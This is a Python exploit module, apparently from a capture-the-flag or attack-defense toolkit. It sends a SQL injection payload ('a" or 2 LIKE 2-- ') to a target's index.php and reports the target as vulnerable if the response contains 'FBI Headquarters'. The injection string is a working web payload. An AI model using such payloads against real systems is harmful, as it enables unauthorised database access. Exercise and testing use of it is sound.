import requests
from Exploit import Exploit, PatchedException
from BetterLogger import logger

COLOR_OKGREEN = '\033[92m'
COLOR_OKBLUE = '\033[94m'
COLOR_ORANGE = '\033[93m'
COLOR_FAIL = '\033[91m'
COLOR_END = '\033[0m'

class ChallengeFiveSQLi(Exploit):
	def __init__(self, ip_address) -> None:
		super().__init__(ip_address=ip_address)

	def run_custom_command(self, command):
		logger.info("ChallengeFiveSQLi does not support running custom commands.")
		return False

	def test_if_vulnerable(self):
		"""
		Returns True if vulnerable and False if not
		"""
		try:
			logger.info("Testing if the target is vulnerable to ChallengeFiveSQLi...")
			url = f"http://{self.ip_address}/index.php"
			payload = {'codename_input': 'a" or 2 LIKE 2-- ', 'submitted': 'TRUE'}
			server_response = requests.post(url, payload)
			server_status_code = server_response.status_code
			server_response_text = server_response.text
			if "FBI Headquarters" in server_response_text:
				logger.info(f"{COLOR_OKGREEN}The target is vulnerable to ChallengeFiveSQLi!{COLOR_END}")
				return True
			logger.info(f"{COLOR_FAIL}The target is not vulnerable to ChallengeFiveSQLi.{COLOR_END}")
			return False
		except PatchedException:
			logger.info(f"{COLOR_FAIL}The target is not vulnerable to ChallengeFiveSQLi.{COLOR_END}")
			return False
